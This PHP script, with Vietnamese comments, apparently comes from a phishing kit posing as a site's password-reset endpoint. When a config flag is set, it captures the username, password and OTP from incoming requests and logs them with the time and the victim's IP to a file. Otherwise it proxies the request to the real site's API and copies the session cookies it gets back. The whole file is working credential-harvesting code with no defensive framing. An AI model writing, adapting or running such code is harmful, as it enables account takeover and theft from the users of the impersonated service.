<?php
include "get_config.php";

// lấy config
$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

//bóc tách dữ liệu
$raw_content = file_get_contents("php://input");

if ($gate_config["save_otp_reset"]) {
	$json_data = json_decode($raw_content, true);
	$otp = $json_data["Otp"];
	$username = $json_data["Username"];
	$password = $json_data["Password"];

	$time = date("H:i:s Y-m-d");
	$ip = $_SERVER["REMOTE_ADDR"];
	$fp = fopen($gate_config["file_otp_reset"], "a+");
	fwrite($fp, "$username|$password|$otp|$time|$ip\n");
	fclose($fp);
	die('{"c":0,"m":""}');
}

echo reset_password($raw_content, $list_header);

function reset_password($raw_content, $list_header)
{
	global $gate_config;
	$url = "https://id.".$gate_config["domain"]."/api/Account/ResetPassword";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
	$raw_content = curl_exec($ch);

	$re = "/Set-Cookie: ([^;]+)/m";
	preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
	foreach ($matches as $match) {
		$key = explode("=", $match[1])[0];
		$val = urldecode(explode("=", $match[1])[1]);
		setcookie($key, $val, time() + (86400 * 30), "/");
	}
	return explode("\r\n\r\n", $raw_content)[1];
}
?>